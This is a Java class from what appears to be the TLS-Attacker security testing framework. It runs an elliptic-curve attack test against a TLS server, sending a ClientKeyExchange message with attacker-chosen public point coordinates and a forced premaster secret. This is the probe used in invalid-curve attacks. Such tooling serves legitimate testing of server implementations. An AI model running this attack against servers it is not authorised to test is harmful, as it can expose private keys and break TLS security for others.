package de.rub.nds.tlsattacker.attacks.impl;

import de.rub.nds.tlsattacker.tls.Attacker;
import de.rub.nds.tlsattacker.attacks.config.EllipticCurveAttackTestCommandConfig;
import de.rub.nds.tlsattacker.modifiablevariable.ModifiableVariableFactory;
import de.rub.nds.tlsattacker.modifiablevariable.biginteger.BigIntegerModificationFactory;
import de.rub.nds.tlsattacker.modifiablevariable.biginteger.ModifiableBigInteger;
import de.rub.nds.tlsattacker.modifiablevariable.bytearray.ByteArrayModificationFactory;
import de.rub.nds.tlsattacker.modifiablevariable.bytearray.ModifiableByteArray;
import de.rub.nds.tlsattacker.tls.config.ConfigHandler;
import de.rub.nds.tlsattacker.tls.protocol.handshake.constants.HandshakeMessageType;
import de.rub.nds.tlsattacker.tls.protocol.handshake.messages.ECDHClientKeyExchangeMessage;
import de.rub.nds.tlsattacker.tls.workflow.TlsContext;
import de.rub.nds.tlsattacker.tls.workflow.WorkflowExecutor;
import de.rub.nds.tlsattacker.tls.workflow.WorkflowTrace;
import de.rub.nds.tlsattacker.transport.TransportHandler;
import org.bouncycastle.util.BigIntegers;

/**
 * 
 * @author Juraj Somorovsky <juraj.somorovsky@rub.de>
 */
public class EllipticCurveAttackTest extends Attacker<EllipticCurveAttackTestCommandConfig> {

    /**
     * EC field size, currently set to 32, works for curves with 256 bits!
     * (TODO)
     */
    private static final int CURVE_FIELD_SIZE = 32;

    public EllipticCurveAttackTest(EllipticCurveAttackTestCommandConfig config) {
	super(config);
    }

    @Override
    public void executeAttack(ConfigHandler configHandler) {
	TransportHandler transportHandler = configHandler.initializeTransportHandler(config);
	TlsContext tlsContext = configHandler.initializeTlsContext(config);
	WorkflowExecutor workflowExecutor = configHandler.initializeWorkflowExecutor(transportHandler, tlsContext);

	WorkflowTrace trace = tlsContext.getWorkflowTrace();
	ECDHClientKeyExchangeMessage message = (ECDHClientKeyExchangeMessage) trace
		.getFirstHandshakeMessage(HandshakeMessageType.CLIENT_KEY_EXCHANGE);

	// modify public point base X coordinate
	ModifiableBigInteger x = ModifiableVariableFactory.createBigIntegerModifiableVariable();
	x.setModification(BigIntegerModificationFactory.explicitValue(config.getPublicPointBaseX()));
	message.setPublicKeyBaseX(x);

	// modify public point base Y coordinate
	ModifiableBigInteger y = ModifiableVariableFactory.createBigIntegerModifiableVariable();
	y.setModification(BigIntegerModificationFactory.explicitValue(config.getPublicPointBaseY()));
	message.setPublicKeyBaseY(y);

	// set explicit premaster secret value (X value of the resulting point
	// coordinate)
	ModifiableByteArray pms = ModifiableVariableFactory.createByteArrayModifiableVariable();
	byte[] explicitePMS = BigIntegers.asUnsignedByteArray(CURVE_FIELD_SIZE, config.getPremasterSecret());
	pms.setModification(ByteArrayModificationFactory.explicitValue(explicitePMS));
	message.setPremasterSecret(pms);

	workflowExecutor.executeWorkflow();

	transportHandler.closeConnection();
    }

}
